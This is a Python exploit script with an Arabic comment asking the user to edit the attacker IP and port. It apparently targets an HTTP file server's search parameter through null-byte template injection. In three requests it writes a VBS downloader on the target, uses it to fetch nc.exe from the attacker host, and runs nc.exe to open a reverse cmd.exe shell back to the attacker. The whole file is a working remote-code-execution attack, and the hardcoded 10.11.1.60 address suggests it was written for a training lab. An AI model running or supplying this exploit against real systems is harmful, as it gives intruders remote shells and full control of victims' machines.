import sys
import urllib.request

if len(sys.argv) != 3:
    print("[-] Usage: python3 exploit.py <Target IP> <Target Port>")
    sys.exit(1)

target_ip = sys.argv[1]
target_port = sys.argv[2]

# المتغيرات الخاصة بك (غير الـ IP لو محتاج وبورت الاستقبال)
attacker_ip = "10.11.1.60"
attacker_port = "5555"

vbs = f'C:\\Users\\Public\\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F{attacker_ip}%2Fnc.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with'
save = "save|" + vbs

vbs2 = "cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs"
exe = "exec|" + vbs2

vbs3 = f'C%3A%5CUsers%5CPublic%5Cnc.exe%20-e%20cmd.exe%20{attacker_ip}%20{attacker_port}'
exe1 = "exec|" + vbs3

try:
    print("[+] Sending VBS script creation request...")
    urllib.request.urlopen(f"http://{target_ip}:{target_port}/?search=%00{{.+{save}.}}")
    
    print("[+] Executing VBS script to download nc.exe...")
    urllib.request.urlopen(f"http://{target_ip}:{target_port}/?search=%00{{.+{exe}.}}")
    
    print("[+] Triggering Reverse Shell via Netcat...")
    urllib.request.urlopen(f"http://{target_ip}:{target_port}/?search=%00{{.+{exe1}.}}")
    print("[+] Exploit sent successfully! Check your netcat listener.")
except Exception as e:
    print(f"[-] Something went wrong: {e}")
